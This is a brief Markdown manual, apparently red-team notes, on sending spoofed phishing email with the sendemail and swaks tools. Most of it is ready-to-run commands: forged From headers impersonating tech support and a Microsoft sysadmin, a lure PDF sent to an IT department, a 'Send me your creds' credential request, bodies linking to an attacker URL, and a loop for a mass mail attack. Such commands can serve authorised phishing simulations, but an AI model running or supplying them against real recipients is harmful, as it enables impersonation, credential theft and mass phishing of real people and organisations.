# Manual

## 01 - SendEmail

### 1.1 - Syntax

Syntax usage of the program.

```
$ sendemail -t <reciever_email_address> -f <sender_email_address> -s <smtp_relay_server_IP>:<PORT> -u "<Subject>" -a file.txt -o message-header="From: <fake_name> <<spoof_email>>"
If you are manually typing in a message:
  - First line must be received within 60 seconds.
  - End manual input with a CTRL-D on its own line.
If you are manually typing in a message:
  - First line must be received within 60 seconds.
  - End manual input with a CTRL-D on its own line.

A body paragraph that is written line by line
until you press CTRL-D to end the input
```

You can pass the credentials for your SMTP mail server.

```
$ sendemail -xu <email> -xp <password> -s <smtp_server_IP>[:<PORT>] -f <spoof_email> -t <email_target> -u "<subject>" -m "<message>" -o message-header="From: <fake_name> <<spoof_email>>"
```

### 1.2 - Usage

Here's an example just to show you how it works.

```
$ sendemail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u "Important Upgrade Instructions" -a /tmp/BestComputers-UpgradeInstructions.pdf -o message-header="From: Tech Support <techsupport@bestcomputers.com>"
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
  - First line must be received within 60 seconds.
  - End manual input with a CTRL-D on its own line.

IT Dept,

We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.

Sincerely,
<fake_name>
```

For passing the credentials.

```
$ sendemail -xu attacker@email.com -xp <password> -s email.com -f sysadmin@microsoft.com -t john@microsoft.com -u "Subject Name" -m "Send me your creds" -o message-header="From: SysAdmin <sysadmin@microsoft.com>"
```

## 02 - Swaks

### 2.1 - Syntax

```
$ swaks --to <reciever_email_address> --from <sender_email_address> --header "Subject: test" --body "<body_paragraph>" --server <smtp_server_IP>
```

### 2.2 - Usage

```
$ swaks --to itdept@victim.com --from techsupport@bestcomputers.com --header "Subject: test" --body "Please click the link <attacker_URL>" --server 192.168.8.131
```

Perform a mass mail attack.

```
$ while read -r email
do
	swaks --to $email --from techsupport@bestcomputers.com --header "Subject: test" --body "Please click the link <attacker_URL>" --server 192.168.8.131
done < emails.txt
```